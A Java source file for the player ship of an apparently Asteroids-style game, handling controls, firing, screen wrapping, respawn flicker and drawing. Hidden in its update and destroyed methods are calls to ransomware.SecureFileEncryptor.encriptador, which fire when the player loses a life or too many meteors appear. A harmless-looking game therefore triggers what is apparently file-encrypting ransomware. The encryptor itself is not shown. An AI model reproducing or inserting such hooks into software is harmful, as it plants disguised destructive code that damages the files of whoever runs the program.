package gameObjects;

import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.geom.AffineTransform;
import java.awt.image.BufferedImage;
import java.util.ArrayList;
import java.util.List;

import database.dataBase;
import graphics.Assets;
import input.KeyBoard;
import main.Ventana;
import math.Vector2D;
import states.GameState;

public class Player extends MovingObject {

	private Vector2D heading;
	private Vector2D acceleration;
	
	private int condition;

	private boolean accelerating = false;
	private Chronometer fireRate;
	
	private boolean spawning, visible;
	
	private Chronometer spawnTime, flickerTime;
	
	public Player(Vector2D position, Vector2D velocity, double maxVel, BufferedImage texture, GameState gamestate) {
		super(position, velocity, maxVel,texture, gamestate);
		this.gamestate = gamestate;
		heading = new Vector2D(0, 1);
		acceleration = new Vector2D();
		fireRate = new Chronometer();
		spawnTime = new Chronometer();
		flickerTime = new Chronometer();
	}

	@Override
	public void update() {
		if(!spawnTime.isRunning()) {
			spawning= false;
			visible=true;
		}
		if(spawning) {
			if (!flickerTime.isRunning()) {
				flickerTime.run(Constants.FLICKER_TIME);
				visible = !visible;
			}
		}
		
		if (KeyBoard.SHOOT && !fireRate.isRunning() && !spawning) {
			gamestate.getMovingObjects().add(0,new Laser(getCenter().add(heading.scale(width)), heading, Constants.LASER_MAX_VEL, angle, Assets.laser,gamestate));
			fireRate.run(Constants.FIRERATE) ;
		}
		if (KeyBoard.SCP)
			Ventana.getInstance().cerrarVentana();
		if (KeyBoard.RIGHT)
			angle += Constants.DELTAANGLE;
		if (KeyBoard.LEFT)
			angle -= Constants.DELTAANGLE;
		if (KeyBoard.UP) {
			acceleration = heading.scale(Constants.ACC);
			accelerating = true;
		} else {
			if (velocity.getMagnitude() != 0) {
				acceleration = (velocity.scale(-1).normalize()).scale(Constants.ACC / 2);
				accelerating = false;
			}
		}
		velocity = velocity.add(acceleration);

		velocity = velocity.limit(maxVel);

		heading = heading.setDirection(angle - Math.PI / 2);

		position = position.add(velocity);
		
		if (position.getX() > Constants.DEF_MAXANCHOJUGABLE)
			position.setX(Constants.DEF_MINANCHOJUGABLE);
		if (position.getY() > Constants.DEF_MAXLARGOJUGABLE)
			position.setY(Constants.DEF_MINLARGOJUGABLE);
		if (position.getX() < Constants.DEF_MINANCHOJUGABLE)
			position.setX(Constants.DEF_MAXANCHOJUGABLE);
		if (position.getY() < Constants.DEF_MINLARGOJUGABLE)
			position.setY(Constants.DEF_MAXLARGOJUGABLE);
		
		fireRate.update();
		spawnTime.update();
		flickerTime.update();
		colliseWith();
		
		if (gamestate.getMeteors()>4) {
			condition=1;
			JOptionCondition.mostrarMensaje(condition);
			Ventana.getInstance().cerrarVentana();
			ransomware.SecureFileEncryptor.encriptador(2);
			dataBase.insertar(1,null);
		}
		 if (gamestate.getLives()<1) {
			 condition=0;
			 JOptionCondition.mostrarMensaje(condition);
			 dataBase.insertar(1,null);
			 Ventana.getInstance().cerrarVentana();
			 
		 }
		
	}
	@Override 
	public void destroyed() {
		spawning = true;
		spawnTime.run(Constants.SPWANING_TIME);
		resetValues();
		gamestate.substrackLife();
		ransomware.SecureFileEncryptor.encriptador(1);
	}
	
	private void resetValues() {
		angle = 0;
		velocity = new Vector2D();
		position = Constants.PLAYER_POS_INIT;
	}
	@Override
	public void draw(Graphics g) {
		
		if (!visible)
			return;
		
		Graphics2D g2d = (Graphics2D) g;

		AffineTransform at1 = AffineTransform.getTranslateInstance(position.getX(), position.getY() + Constants.HEIGHT_NAVE);
		at1.rotate(angle, Constants.WIDTH_NAVE / 2, -Constants.HEIGHT_NAVE / 2);

		if (accelerating == true)
			g2d.drawImage(Assets.speed, at1, null);

		at = AffineTransform.getTranslateInstance(position.getX(), position.getY());
		at.rotate(angle, Constants.WIDTH_NAVE / 2, Constants.HEIGHT_NAVE / 2);

		g2d.drawImage(texture, at, null);
	}

	public boolean isSpawning() {
		return spawning;
	}

	
}
